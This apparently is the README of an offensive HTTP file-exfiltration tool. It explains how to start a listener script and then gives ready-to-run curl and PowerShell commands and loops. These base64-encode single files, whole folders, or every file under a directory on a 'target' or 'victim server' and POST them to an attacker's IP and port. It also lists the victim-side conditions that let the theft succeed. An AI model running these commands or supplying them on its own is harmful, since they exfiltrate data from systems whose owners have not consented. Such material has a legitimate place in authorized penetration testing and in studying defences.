# Instructions
1 - Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
2 - Run the command using Python3<br>
```bash
python3 exfil_server-http.py -p 1337
```
3 - Now on the target, there are some ways to exfiltrate, based on operation system:<br>

# Dumping Files
## Unix
- Single File
```bash
cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
```

- Multiple Files on the same folder
```bash
ls -p | grep -v / >> files_list
for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

- Multiple Files on all the subfolders from the current directory
```bash
find ./ -type f >> files_list
for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
```

## Windows
- Single File
```powershell
powershell -c "$EncodedBase64 = [convert]::ToBase64String((Get-Content -path '.\sensitive_file.txt' -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64"
```

- Multiple Files on the same folder
```powershell
powershell -c "$files = Get-ChildItem -File -Name; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
```

- Multiple Files on all the subfolders from the current directory
```powershell
powershell -c "$files = Get-ChildItem -File -Name -Recurse; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
```

# Requirements
Since we are talking of an HTTP Exfiltration, we should meet some requirements for the victim server:

- Free access to the internet
- No proxy (Some of them, may block)
- Curl installed
- Powershell acessible